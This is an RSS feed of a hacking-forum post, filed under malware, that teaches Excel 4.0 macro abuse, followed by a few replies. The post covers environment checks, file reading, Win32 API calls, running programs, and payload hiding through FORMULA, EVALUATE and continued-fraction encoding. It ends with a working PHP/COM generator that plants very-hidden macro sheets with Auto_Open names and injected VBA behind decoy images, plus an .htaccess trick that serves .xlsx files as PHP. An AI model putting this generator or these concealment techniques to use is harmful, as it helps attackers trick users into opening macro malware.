<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Excel | Primi passi</title>
    <link>https://0x00sec.org/t/excel-primi-passi/20458</link>
    <description>In the name of Allah, the most beneficent, the most merciful.

---

# Introduction
*&quot;I believe in the existence within myself of a power.
From this belief derives my will to exert it.&quot;*

I&#39;ve always considered practice a *golden key* to further comprehend a given subject.
Experimentation expands theory and stimulates creativity, as there is virtually no limit to what could be learnt or done.

## Excel - Basics

In Excel, the initial file on which the user operates is called a *Workbook* that initially is composed of *three Worksheets* as seen below:
  
![image|255x17](upload://wnyptkYgfnWetONdtWiJhmtMQ4G.png)  

Each *single sheet* consists of *alphabetic columns* and *numeric rows*, with the *selected cell* name indicated in an *Edit control* **above** (e.g.: *B2*):

![image|187x105, 100%](upload://4wH8Qa3XygwQBrrArlzDxQLBh1n.png)    
The user has the possibility to automate calculations in a Worksheet by using *Formulas*. Once defined they can easily applied to other *adjacent cells* as well:
![image|188x42](upload://bpjsdQ3lJ0NVJGfQV1kqUzF4mB0.png)

![image|188x43](upload://51LmBJm9qKZ4CzpzTWvQwuvnbrj.png)

![image|187x42](upload://rchnd9QgZVI3v0pm760TwB5gmSQ.png)

Furthermore, *multiple functions* are provided for logical operations such as an `IF` case:

![image|347x42](upload://hqRVKgd4rj3mJHL9CWTANeVLmH5.png) 
This translates to:
```
=IF(OR(A1&lt;A2; FALSE); 1; 0)
```  

## Macros
*Macros* are declarations of one to several procedures, which either have a return-value, in which case they are considered a *Function* or  in case they do not have one they are labeled as a *Sub*.   
Excel also comes with a *Visual Basic Editor* that is efficient for real-time creation and testing of Macros.
By default it can be invoked using the Hotkey *ALT+F11* and looks like this:

![image|215x335](upload://2YDoN0evf62IdNQMYEbzhcYIU5r.png)
In case of us adding macros the file extensions will have to be either *XLS* or *XLSM* to support these macros:
![image|629x45, 80%](upload://nnLsRMRAvHmBXq3mFH4EUBDL6Px.png)
\--
![image|157x65](upload://93Ksf3wYhfz0JWIaVPGIaMW4FZB.png)
Similarly a new icon already displays mistrust towards XLSM files du to macros being able to cause harm without a user actively knowing...
Additionally, when these file with macros are opened, a *security warning* is displayed to raise awareness of *potential risks*, and asks if the user consents to enable the macros.
![image|438x32](upload://a9R3cyuucqTO4T5T2cDttlS1GuB.png)
\--
![image|483x426, 75%](upload://61Txgi2dGuHfPgccENelYxbiOVJ.png) 
This certainly should not be done unless *our document have been thoroughly analysed*.

### Macros - XL4 Edition

XL4 are considered legacy macros that are still supported in newer Excel versions.
Their powerful nature allows them to perform multiple actions.
They can be executed either by: 

- using *VBA&#39;s* ExecuteExcel4Macro, or
![image|645x199, 85%](upload://7rEP1mRwoqATWex5n3WoMY4NaNF.png)
- inserting *a seperate Excel 4.0 module*.
![image|257x237](upload://4dF6csRYj1lwk5ble2t2q0WSy6S.png)  ![image|116x205](upload://jMdCJId7YEF7AFnJ5ucQELv0s4C.png)

#### Running and debugging an Excel 4.0 macro:
In case we have inserted a macro in our Excel sheet like seen below we can execute and debug it a follows.
1. First we select *execute* from the context menu
![image|555x241](upload://hJVLTFlFYMTga85dxPbo4lq9tKm.png) 
2. Then we select which cell (==name) to execute
![image|416x102](upload://aHlqJ3CaNAekyogiwCV7TzZ5pW6.png)
3. Finally we have to confirm out choices and are good to go!
![image|371x174](upload://9MaMKMusc3G0IO7aG2VBHx5kusi.png)  
In our case a simple message will be displayed when upon completion:
![image|305x37](upload://m2k7YkdYpriNRe8G8pudajyrxU2.png)

#### Macros - Demonstrating advanced funcionality

* **Identifying the current runtime environment**:
For this test we need a mix of `SET.NAME`, `GET.WORKSPACE` and and `IF` condition.
The function `GET.WORKSPACE` requires a `Type_num` integer, which specifies the information to be retrieved.
![image|546x121](upload://3TrcAOnx3juOPv9t7ugz6ebAD4T.png)
`SET.NAME` assigns its return-value to a variable called `ENV`, It is then instructed using the `IF` to `QUIT` if it cannot not `FIND` (case-sensitive) *Windows* in `ENV`.
Additionally, functions like `SEARCH`, or `GOTO` to redirect execution to a specific cell can be used aswell.
This full macro looks like this:
   ```
    =SET.NAME(&quot;ENV&quot;, GET.WORKSPACE(1))
   =IF(FIND(&quot;Windows&quot;, ENV), ALERT(ENV), QUIT())
   =HALT()
   ```

  ![image|236x109](upload://71Ncq0mw4nWUkwuhtfwLOc3EFKp.png) 

---

* **Reading one or multiple files:**
Even from within Excel we can access files on disks. In this setup we have a folder and two files as follows:
![image|384x23](upload://gDeXq89O43tiUbp7zgsupQA4xo8.png)
![image|379x42](upload://8JeK6Xkut5Rajsg08p7N1JRtVmo.png)
We can traverse directories with the `DIRECTORY` function before obtaining a directorys file list with `FILES`, which returns an array.
 In our case this is: `{&quot;111.&quot;, &quot;222.&quot;}`.
We can access files with `FOPEN`, which takes an index from a file list array and a mode:
![image|544x201, 90%](upload://pCeHivwhnjA0kGI24mVEDtZoXx6.png)
We can continue to read the contents with `FREADLN` until *EOF* is hit.
For some entertainment we can utilize the `BEEP` call, which simply emits a sound :smile:.

  ```
  =BEEP()
  =DIRECTORY(&quot;C:\000\&quot;)
  =SET.NAME(&quot;FLIST&quot;, FILES())
  =FOR(&quot;IDX&quot;, 1, COLUMNS(FLIST))
  =SET.NAME(&quot;FNUM&quot;, FOPEN(INDEX(FLIST, IDX), 2))
  =WHILE(NOT(FPOS(FNUM) &gt; FSIZE(FNUM)))
  =ALERT(&quot;L~: &quot; &amp; FREADLN(FNUM))
  =NEXT()
  =FCLOSE(FNUM)
  =NEXT()
  =HALT()
  ```

  ![image|237x109](upload://8u69UzTPdKzH1gHHqzGNg50WJDy.png)  ![image|237x109](upload://fNZSL7X0NoC8nnitQ7ybR8VceHi.png)

---

* **Calling external functions**:
We can also invoke external functionality from the Win API, because why not!
For example we can `REGISTER` the function `user32!SwapMouseButton` with *&quot;AA&quot;* as its [*type_value*](https://support.office.com/en-us/article/using-the-call-and-register-functions-06fa83c1-2869-4a89-b665-7e63d188307f#__toc309221612).
It reverses or restores the role of the left and right mouse buttons:

  ![image|200x124](upload://luNMOFiQjRef8I6z1eWXVAtgeFq.png) || ![image|233x152](upload://64fu0plG6n2YiC1N8l9SM6hDaA1.png) 
We have to use a `CALL` to invoke the cell which was used to `REGISTER` the function.
`GET.WORKSPACE` with argument 44 is able to extract the location of the loaded DLL.
![image|548x226](upload://wm9y1urVNa6YGCDG5fJ49n2Ck7L.png) 
Putting that all together with the knowledge from the prior examples leaves us with the following macro code:
  ```
  =REGISTER(&quot;user32&quot;, &quot;SwapMouseButton&quot;, &quot;AA&quot;)
  =ALERT(&quot;Library at &quot; &amp; GET.WORKSPACE(44), 3)
  =CALL(A1, TRUE)
  =UNREGISTER(A1)
  =HALT()
  ```
  When finished it yields:
![image|303x108](upload://nmAZRpvyzGsGosMWAPqSPctB4bG.png) 
And *mouse buttons have been indeed swapped*!  
---

* **Executing binaries on the FS:**
So far this was all just for fun and some file system enumeration but binaries can be executed from within excel as well. 
For example we can spawn the calculator by calling `EXEC` with one of the following arguments:
![image|533x187](upload://lW3rtQiiR4zf3zGJ7oApezKXNsW.png)
  ```
  =EXEC(&quot;CALC&quot;, 1)
  =HALT()
  ```
  Alternatively, we can also simulate key presses by using [KEYS.SEND](https://docs.microsoft.com/en-us/office/vba/api/excel.application.sendkeys).
However, it&#39;ll be slower, since there has to be a small timeout delay of abour 2~4 seconds for some reason before the process can run:
  ![image|441x94](upload://oNn4F0ySonTnutFREsLMb7DFQIw.png)
  ```
  =EXEC(&quot;CMD&quot;, 2)
  =WAIT(NOW() + &quot;00:00:02&quot;)
  =SEND.KEYS(&quot;CALC~&quot;, TRUE)
  =HALT()
  ```
  As a second example I&#39;ll show that a call to `ShellExecuteA` is also feasible..
![image|259x177](upload://1kgEieBvococ6NBT3eqokXtqpKt.png)
We define the following arguments:
  * hwnd = -1(J(Int)),
  * lpFile = &quot;CALC&quot;(C(Char \*))
  * nShowCmd = 5(H(UInt16_t))
  * remaining is to be ignored with 0(J(Int)).*
  ```
  =CALL(&quot;shell32&quot;, &quot;ShellExecuteA&quot;, &quot;JJJCJJH&quot;, -1, 0, &quot;CALC&quot;, 0, 0, 5)
  =HALT()
  ```
  Again, an alternative to that can be using `INITIATE` that prepares a DDE channel with an arbitrary application, except this method warns the user!
  ```
  =INITIATE(&quot;CALC&quot;, 0)
  ```
  ![image|690x121, 80%](upload://zYYhBB0jnORurrCcOftS0yu7bA2.png) 
\--
  ![image|413x375](upload://t6MO23ygvqDpTFEmCjaUxXAz5IH.png) 

---
* **Obsfucation**:
A cell&#39;s `FORMULA` can be overwritten, consequently, the payload can be concealed.
If A1 pre-execution contains:
  ```
  =FORMULA(&quot;=EXEC(&quot;&quot;CALC&quot;&quot;)&quot;, A2)
  ```
  On execution, A2 will be populated with the result, and executed right after.
  ```
  =EXEC(&quot;CALC&quot;)
  ```
  Another technique is using `EVALUATE`:
  ```
  =ALERT(EVALUATE(CHAR(61) &amp; CHAR(70) &amp; CHAR(105) &amp; CHAR(108) &amp; CHAR(101) &amp; CHAR(115) &amp; CHAR(40) &amp; CHAR(41)))
  ```
  Once we execute this we get the following:
![image|237x109](upload://jyiBsDoXt863Bt0jJD4oG0ATuBt.png) 
To fine tune this obfuscation technique we can use @Emparetiw_Aparajdm&#39;s method for [*Continued Fraction Data Encoding*](https://0x00sec.org/t/continued-fraction-data-encoding/3108)!
His suggestion is to concatenate ASCII codes in order to form a nominator.
The *key denominator* is to be randomly generated.
The *decimal codes* need to be padded(`3`) to ensure information sufficiency:
![fract|690x376, 75%](upload://fnUeqGkVzWucNZ5cwJ87WZTawez.png)
Here the `x` being the result of the devision `u/v`.
For example by using this method the string *&quot;=EX&quot;* can be encoded as *061069088*.
The following PHP script implements this exact behavior:
  ```php
  &lt;?php
  $u = 61069088;
  $v = 41758269584;
  $e = [];
  
  while(($r = $u % $v) != 0)
  {
  	$a = intval($u / $v);
  	$u = $v;
  	$v = $r;
  	array_push($e, $a);
  }
  
  var_dump($e);
  ?&gt;
  ```
  The script yields the following result:
  ![image|596x63, 100%](upload://m0V3Abou5SYC0e4vVGpRNZSQTe7.png) 
  That chain of `a0, a1, a2, .., a17` can be used to reverse the process, multiplied by *v* will yield *u*.
  The obtained array is to be reversed(`array_reverse`) and stored in an Excel row.
  In another row, the denominator(aka *key*) will be stored.
  ![image|346x278](upload://gmhJeSx3s0r0RIqFTlKzmbNYe8r.png)
  Reversing it is easily done with the following macro:
  ```
  =SET.NAME(&quot;P&quot;, 0)
  =FOR.CELL(&quot;N&quot;, A1:A18, FALSE)
  =SET.NAME(&quot;P&quot;, (P + N) ^ -1)
  =NEXT()
  =SET.VALUE(B2, TEXT(CEILING((P ^ -1) * B1, 1), REPT(CHAR(48), 3*3)))
  =ALERT(B2)
  =FOR(&quot;H&quot;, 0, 2)
  =SET.VALUE(B3, B3 &amp; CHAR(MID(B2, H*3 + 1, 3)))
  =NEXT()
  =ALERT(B3)
  =HALT()
  ```
  ![image|236x109](upload://7OT8zsnUE6DPb1JMGCZNdKrSB5T.png) ![image|237x109](upload://iw3FCo5pEgZbB7qFGvDKdfD3fss.png) 

  [Excel 4.0 Functions](http://www.44lbs.net/ilia/Excel4macro.zip)

### Automatic malicious-document generation
*&quot;For the seeker of truth nothing takes precedence over the truth,
and there is no disparagement of the truth,
nor belittling either of him who speaks it or of him who conveys it.&quot;*

My local test environment had XAMPP already installed, a slight modification of its *php.ini* allows us to use *COM* extensions:
![image|364x276](upload://zotTIsO6oU4YUGacv1lttgcyWD3.png)
Additionally, us allowing  [VBProject modification programmatically](https://support.microsoft.com/en-us/help/282830/programmatic-access-to-office-vba-project-is-denied) is also required.
![image|338x57](upload://82yKzZ2QAw3qWHpBbJR0UzopVRo.png)
Now, pretty much everything can be done with the [Excel object model](https://docs.microsoft.com/en-us/visualstudio/vsto/excel-object-model-overview?view=vs-2019)...
From spawning `EXCEL.EXE` to creating an entire document that fits our needs!  
I&#39;ll be using  **OleView .NET** to explore registered *COM objects*.
It makes our life a lot easier! 
We can start by doing:
![image|240x147](upload://6im6nfCEOOyr6j7Zm5o3TWqbdNT.png) || ![image|501x413, 80%](upload://npVj1eWQ3t7pfjZD7K90y9XLYlp.png) 
*Members* of a COM object can be identified by fetching the *Typelib*.
For that purpose, PHP provides a function called `com_print_typeinfo`.
![image|690x142, 80%](upload://sioRfJSEOX9Dad2d0FxpBgoOQR4.png)
We can use it as follows:
```php
$XL = new COM(&#39;Excel.Application&#39;) or die(0);
com_print_typeinfo($XL);
```
The result is a whole page of all the Elements of our XL object.
All these properties can be used to tweak the nature of the document that we&#39;re about to create
We&#39;ll start by looking at three important ones of different nature.

![image|366x59](upload://kQVE2iefA6krhReAq3kmF62u0x6.png) 
The [first property](https://docs.microsoft.com/en-us/office/vba/api/excel.application.visible) allows to get or set the state of the window visibility.
The second is a collection of all open [Workbooks](https://docs.microsoft.com/en-us/office/vba/api/excel.workbooks).
The third is a method, and it simply *terminates the process*.
Putting that knowledge to use in our PHP script:
```php
$XL-&gt;Visible = TRUE;
$WB = $XL-&gt;Workbooks;
com_print_typeinfo($WB);
Sleep(60);
$XL-&gt;Quit();
```
When executed Excel becomes visible in the taskbar, which is essential for debugging.
![image|76x41](upload://xlGScW048Gxyi2MDZaGCdRP41pi.png)
However we&#39;re just greeted with the following Excel window.. 
This does not seem quite useful for now.
![image|343x253, 80%](upload://wWqpbKeUykvB4Gqr50ymWPOo7pE.png) 
This beehavior occurs, because initially the Workbooks count is 0, hence the Excel window is empty.
![image|639x40](upload://2E6u4O33PHZT9KnqqTuhX48WCJh.png)
```
printf(&quot;Count: %d&quot;, $XL-&gt;Workbooks-&gt;Count);
$WB = $XL-&gt;Workbooks-&gt;Add();
```

![image|60x19](upload://qkPrqL9uPrD94u113xVzZOzOkjf.png)
To add one, we must use `Workbooks.Add()`, the returned object is the new Workbook.
![image|337x261, 80%](upload://hucwtOB7G8XGITYnKjtU8zeKv2Z.png) 
The workbook by default holds `$XL-&gt;SheetsInNewWorkbook`(3) worksheets.
This corresponds to the usual `Sheet1, Sheet2, Sheet3`
The amount of workbooks is stored in an object called *Worksheets*...
![image|363x20](upload://ihnQ6JLoAWkeA0NWw7tc5wQaWVW.png)
The same Excel object reference list also offers the *SaveAs* function with all meta data fields we can set by hand when using the GUI..:
```
/* DISPID=1925 */ function SaveAs(
/* VT_VARIANT [12] [in] */ $Filename, /* VT_VARIANT [12] [in] */ $FileFormat,
/* VT_VARIANT [12] [in] */ $Password, /* VT_VARIANT [12] [in] */ $WriteResPassword,
/* VT_VARIANT [12] [in] */ $ReadOnlyRecommended, /* VT_VARIANT [12] [in] */ $CreateBackup,
/* ? [29] [in] */ $AccessMode, /* VT_VARIANT [12] [in] */ $ConflictResolution,
/* VT_VARIANT [12] [in] */ $AddToMru, /* VT_VARIANT [12] [in] */ $TextCodepage,
/* VT_VARIANT [12] [in] */ $TextVisualLayout, /* VT_VARIANT [12] [in] */ $Local ) { }
```
All the supported file extensions by Excel are stored in an enum called *XlFileFormat*, which is described in detail over @ [MSDN](https://docs.microsoft.com/en-us/office/vba/api/excel.xlfileformat).

Anyhow, back to the worksheets object and its [`Add() method`](https://docs.microsoft.com/en-us/office/vba/api/excel.worksheets.add):
```
/* DISPID=181 */ /* VT_DISPATCH [9] */ function Add(
/* VT_VARIANT [12] [in] */ $Before, /* VT_VARIANT [12] [in] */ $After,
/* VT_VARIANT [12] [in] */ $Count, /* VT_VARIANT [12] [in] */ $Type) { }
```
![image|619x152, 90%](upload://tYcThRBmIa7uT37APiZqUL0Arsk.png)
This shows that we can create an XL4 sheet if we pass [`xlExcel4IntlMacroSheet`](https://docs.microsoft.com/en-us/office/vba/api/excel.xlsheettype)(4) as the type.
`Excel4IntlMacroSheets.Add() method` accomplishes the same task, but does not require any arguments:
![image|442x19](upload://9ZcMEYcV7hBrhHRkuSm4XdMICnV.png)
When putting that knowledge to use in our PHP script as follows:
```php
define(&#39;xlExcel4IntlMacroSheet&#39;, 4);
$M1 = $WB-&gt;Worksheets-&gt;Add(NULL, NULL, 1, xlExcel4IntlMacroSheet);
$M2 = $XL-&gt;Excel4IntlMacroSheets-&gt;Add();
```
We get validation of our done research in form of:
![image|401x124](upload://lVGpea26Eon5uQ9FcL7uy01K1AQ.png)
Two new XL4 macro sheets were successfully created.
Now, due to the new changes Excel refuses to just exit and asks if we&#39;d like to save the file.
We can luckily remove this feature by modifying the boolean value of `Application.DisplayAlerts` and set it to *FALSE*:
![image|391x18](upload://8BxWddLqjzv0LyuOLWfGun1XC9O.png)
```php
$XL-&gt;DisplayAlerts = FALSE;
```
Manipulating a worksheet&#39;s content is the next thing for us to do!
```php
com_print_typeinfo($M1);
```
![image|320x36](upload://xcLSq9f9Nh7lTrMJrNtKYINclZw.png) 
For example we can tweak the [Visible](https://docs.microsoft.com/en-us/office/vba/api/excel.worksheet.visible) element in three possible ways:
`{xlSheetVisible(-1), xlSheetHidden(0), xlSheetVeryHidden(2)}`.
```php
define(&#39;xlSheetHidden&#39;, 0);
define(&#39;xlSheetVeryHidden&#39;, 2);
$M1-&gt;Visible = xlSheetHidden;
$M2-&gt;Visible = xlSheetVeryHidden;
```
![image|320x236](upload://sBKTm84a7qhQfWGXPAqsOfE8rUL.png) || ![image|319x197](upload://lUkGJbGa9pQ6uYOnz3vcKWhBuf.png)
This results in the two added sheets being hidden.
However, `$M1` can still be made visible by a normal user.
Some more interesting cell property elements:
![image|479x72](upload://5AMXcRXDn3SXpiKyxbPyPLt2apF.png)
The value of a cell can hold plain text (e.g.: AAABBBC) or a result (e.g.: 8, the SUM of A1;A2) of a formula.
![image|399x106](upload://mJUIX89AWJuzTcqVTPtJjD114dp.png)

```php
$WS = $WB-&gt;Worksheets[1];
Sleep(60);
printf(&quot;Formula: %s&lt;br&gt;Value: %s&quot;, $WS-&gt;Cells[1][1]-&gt;Formula, $WS-&gt;Cells[1][1]-&gt;Value);
```
![image|211x43](upload://vOOoZtHcQh3kYR8nUHrgpPKx4gy.png) 

Ultimately, cells can be accessed as a 2-dimensional array starting with Index = 1.
We can easily simulate that within our PHP script:
```php
$M2-&gt;Cells[3][2]-&gt;Select(); // [Column][Row] Indexing
```
![image|350x61](upload://o0PhcxsiXwFaNfJ0Dk3z6WXbnTV.png) 
```php
$M2-&gt;Cells(3, 2)-&gt;Select(); // (Row, Column) Indexing
```
![image|346x81](upload://g3qVYNCW4dwyQJYJ6SmbT3g4Rwx.png)  
Next, the *ClearContents* procedure role (DISPID=113) clears both the value and an underlying formula of a specified cell.

### Putting it all together
Putting all that prior theory together we can create a simple PoC with the following snippets below.

Let&#39;s define two payloads `0000` and `0001` in form of `.vbs` scripts as follows:

```
# 0000.vbs
=EXEC(&quot;calc&quot;)
=HALT()
```

```
# 0001.vbs
Sub Workbook_Open()
	MsgBox &quot;AAAA&quot;
End Sub
```
A simple *NUExcel.php* library that generates documents could look as follows:
```
&lt;?php
define(&#39;xlExcel8&#39;, 56);
define(&#39;xlExcel4IntlMacroSheet&#39;, 4);

define(&#39;xlSheetHidden&#39;, 0);
define(&#39;xlSheetVeryHidden&#39;, 2);
define(&#39;xlSheetVisible&#39;, -1);

define(&#39;CDirectory&#39;, getcwd());
define(&#39;Payloads&#39;, glob(&quot;payloads/*.vbs&quot;, GLOB_NOSORT));

class DirtyDebug
{
	function DisplayElements($Object)
	{
		$Info = com_print_typeinfo($Object);
		print($Object);
	}
}

class NUExcel extends DirtyDebug
{
	private $XL, $WB;
	public  $Name;
	
	function RName()
	{
		$this-&gt;Name = sprintf(&quot;%s/doc%d.xls&quot;, CDirectory, rand(1, 14782));
	}
	
	function CreateInstance($Visible = FALSE)
	{
		$this-&gt;XL = new COM(&#39;Excel.Application&#39;) or die(0);
		$this-&gt;WB = $this-&gt;XL-&gt;Workbooks-&gt;Add();
		
		$this-&gt;XL-&gt;Visible = $Visible;
		$this-&gt;XL-&gt;DisplayAlerts = FALSE;
		
		return TRUE;
	}
	
	function EndInstance($Save = TRUE)
	{
		if ($Save)
		{
			$this-&gt;RName();
			$this-&gt;WB-&gt;SaveAs($this-&gt;Name, xlExcel8);
		}
		
		$this-&gt;WB-&gt;Close();
		$this-&gt;XL-&gt;Quit();
	}
	
	function CreateXL4Sheet()
	{
		$WC = $this-&gt;WB-&gt;Worksheets;
		return $WC-&gt;Add(NULL, NULL, 1, xlExcel4IntlMacroSheet);
	}
	
	function XL4MacroVisibility($MSheet, $Code)
	{
		if($MSheet &amp;&amp; in_array($Code, array(xlSheetHidden, xlSheetVeryHidden, xlSheetVisible)))
		{
			$MSheet-&gt;Visible = $Code;
		}
	}
	
	function GetCell($Sheet, $RNum, $CNum)
	{
		return $Sheet-&gt;Cells($RNum, $CNum);
	}
	
	function GetSetCellData($Cell, $Formule = TRUE, $Data = &#39;&#39;)
	{
		$Get = TRUE;
		
		if(strlen($Data))
			$Get = FALSE;
		
		if($Formule)
		{
			if($Get)
				return $Cell-&gt;Formula;
			
			$Cell-&gt;Formula = $Data;
		}
		else
		{
			if($Get)
				return $Cell-&gt;Value;
			
			$Cell-&gt;Value = $Data;
		}
		
		return;
	}
	
	function PayloadName($Index)
	{
		$Name = NULL;
		
		if($Index &gt;= 0 &amp;&amp; $Index &lt; count(Payloads))
		{
			$Name = Payloads[$Index];
		}
		
		return $Name;
	}
	
	function WriteXL4Payload($MSheet, $FNum, $CNum = 1, $RNum = 1)
	{
		$F = $this-&gt;PayloadName($FNum);
		if (! $F)
			return;
		
		if(($Handle = fopen($F, &#39;r&#39;)) != FALSE)
		{	
			do
			{
				$this-&gt;GetSetCellData($this-&gt;GetCell($MSheet, $RNum++, $CNum), TRUE, trim(fgets($Handle)));
			} while(! feof($Handle));
		}	
	}
	
	function ClearXL4Row($MSheet, $CNum = 1, $RNum = 1)
	{
		while(($Cell = $this-&gt;GetCell($MSheet, $this-&gt;$RNum++, $CNum)) &amp;&amp; strlen($this-&gt;GetSetCellData($Cell, FALSE)))
		{
			$Cell-&gt;ClearContents();
		}
		return TRUE;
	}
	
	function RunMacro($MName)
	{
		return $this-&gt;XL-&gt;Run($MName);
	}
	
	function SetCellName($Sheet, $CNum, $RNum, $CName)
	{
		$this-&gt;GetCell($Sheet, $RNum, $CNum)-&gt;Name = $CName;
	}
	
	function GetComponents()
	{
		return $this-&gt;WB-&gt;VBProject-&gt;VBComponents;
	}
	
	function WriteVBAPayload($FNum)
	{
		$F = $this-&gt;PayloadName($FNum);
		if (! $F)
			return;
		
		$CM = $this-&gt;GetComponents();
		$CN = $this-&gt;WB-&gt;CodeName;
			
		if(! empty($CN))
		{
			$Module = $CM[$CN]-&gt;CodeModule;
			$Module-&gt;AddFromFile(realpath($F));
			$Module-&gt;AddFromString(chr(32));
		}
	}
	
	function GetWorksheet($Index)
	{
		$WS = $this-&gt;WB-&gt;Worksheets;
		if($WS-&gt;Count &gt;= $Index)
			return $WS[$Index];
		return NULL;
	}
	
	function InsertPicture($Sheet, $File, $Width = -1, $Height = -1)
	{
		if($Sheet)
			$Sheet-&gt;Shapes-&gt;AddPicture(realpath($File), FALSE, TRUE, 0, 0, $Width, $Height);
	}
}
?&gt;
```
Our main routine importing our written library results in a rather short script!
```php
&lt;?php
include &#39;NUExcel.php&#39;;

function Main()
{
	$NEntry = new NUExcel;
	$NEntry-&gt;CreateInstance(TRUE);
	$MS = $NEntry-&gt;CreateXL4Sheet();
	$NEntry-&gt;WriteXL4Payload($MS, 0);
	$NEntry-&gt;SetCellName($MS, 1, 1, &quot;Auto_Ouvrir&quot;); // Auto_Open
	$NEntry-&gt;XL4MacroVisibility($MS, xlSheetVeryHidden);
	$NEntry-&gt;WriteVBAPayload(1);
	$NEntry-&gt;InsertPicture($NEntry-&gt;GetWorksheet(1), &quot;images/image.png&quot;);
	$NEntry-&gt;EndInstance();
	
	if($NEntry-&gt;Name)
	{
		printf(&quot;File at: %s&quot;, $NEntry-&gt;Name);
	}
}

Main();
?&gt;
```
The result is the following file:
![image|480x89](upload://5jBUOocpXIbUJ539SoflmBdjCaJ.png)
Obviously, it&#39;s totally legit looking! :hugs:
![image|387x227](upload://t5DtqSanyWLAI0CV2kIDlyo1wxE.png)
\--
![image|76x40](upload://xYA97Jnwz1iX471XJ3jKrQ9HTs4.png) || ![image|128x126](upload://u4qcdZiSRMWAWw1LX79ia4VZDOu.png) 
We can use the .htaccess file to process a XLSX file as PHP.
```
AddHandler application/x-httpd-php .xlsx
```
![image|276x64](upload://iRTTDQarv4X7niq3ebJOto9pOHo.png) 

### Final thoughts
*There is not much left to be said.
However, an idea will await a passionate individual that&#39;ll make it a reality.
Will it be you?*

*VBA Pervertor: A generator of random reversible-sequence of arithmetic operations(**XOR, ADD, SUB, etc**) to encode individual bytes.*


### Inspirations
*&quot;Ma dimmi cosa resta in questa stanza quando la luce si spegne?
Niente.&quot;*

[*Pervert world wide - Z0MBiE/29A*](https://vxug.fakedoma.in/zines/29a/29a8/Articles/29A-8.005.txt)
[*On Polymorphic Evasion - Phantasmal Phantasmagoria*](https://dl.packetstormsecurity.net/papers/bypass/PolymorphicEvasion.txt)
[*On First Philosophy - Al-Kindi*](https://en.wikipedia.org/wiki/Al-Kindi)
[*Marquis de Puységur*](https://en.wikipedia.org/wiki/Amand-Marie-Jacques_de_Chastenet,_Marquis_of_Puys%C3%A9gur)


### Thanks
*To my father without whom this article wouldn&#39;t have been possible to write.
To Da, To, **Pr**, Ad, Ka, Mwo, Mt, Pw, Xl, Zi, Mz (y&#39;all know who you are)*;

**To @ricksanchez who made the article a million times better!** :heart:
To @pry0cc, @Cry0l1t3 for not hesitating to offer help.
To @jeff for the the encouragement.
To @Leeky, @_py, @dtm, @Danus  and all of 0x00sec for being amazing peoples.

### End
*`Limits are there to be broken, expectations to be surpassed, existence to be proved.`*

*I am the nobody.
I am an addict.
I am madness personified.*
~ exploit (out)</description>
    
    <lastBuildDate>Fri, 17 Apr 2020 07:05:49 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/excel-primi-passi/20458.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Excel | Primi passi</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/excel-primi-passi/20458/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/excel-primi-passi/20458/8</link>
        <pubDate>Wed, 12 Aug 2020 09:17:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20458-8</guid>
        <source url="https://0x00sec.org/t/excel-primi-passi/20458.rss">Excel | Primi passi</source>
      </item>
      <item>
        <title>Excel | Primi passi</title>
        <dc:creator><![CDATA[th1nk3r]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for this tutorial. I love the screen captures you made. Even I can understand it <img src="https://0x00sec.org/images/emoji/twitter/grin.png?v=9" title=":grin:" class="emoji" alt=":grin:">. Is it a virtual machine?</p>
          <p><a href="https://0x00sec.org/t/excel-primi-passi/20458/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/excel-primi-passi/20458/7</link>
        <pubDate>Fri, 17 Apr 2020 07:05:49 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20458-7</guid>
        <source url="https://0x00sec.org/t/excel-primi-passi/20458.rss">Excel | Primi passi</source>
      </item>
      <item>
        <title>Excel | Primi passi</title>
        <dc:creator><![CDATA[hunter]]></dc:creator>
        <description><![CDATA[
            <p>Concealing payload inside cells? I loved it <img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"> <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"><br>
The other day I saw something similar in some msword pest I had been analysing. Malicious payload was concealed inside a Textbox (not visible to user). Then its contents were fetched and executed by a Macro. If you didn’t pay attention you could misidentify the macro code as benign. It was very simple yet a clever trick imo.</p>
          <p><a href="https://0x00sec.org/t/excel-primi-passi/20458/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/excel-primi-passi/20458/6</link>
        <pubDate>Mon, 13 Apr 2020 10:54:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20458-6</guid>
        <source url="https://0x00sec.org/t/excel-primi-passi/20458.rss">Excel | Primi passi</source>
      </item>
      <item>
        <title>Excel | Primi passi</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/excel-primi-passi/20458/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/excel-primi-passi/20458/5</link>
        <pubDate>Sun, 12 Apr 2020 20:22:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20458-5</guid>
        <source url="https://0x00sec.org/t/excel-primi-passi/20458.rss">Excel | Primi passi</source>
      </item>
      <item>
        <title>Excel | Primi passi</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/danus">@Danus</a> Stop reading that! It’s not done yet  xD. You better re-read it soon <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/excel-primi-passi/20458/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/excel-primi-passi/20458/4</link>
        <pubDate>Sun, 12 Apr 2020 19:33:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20458-4</guid>
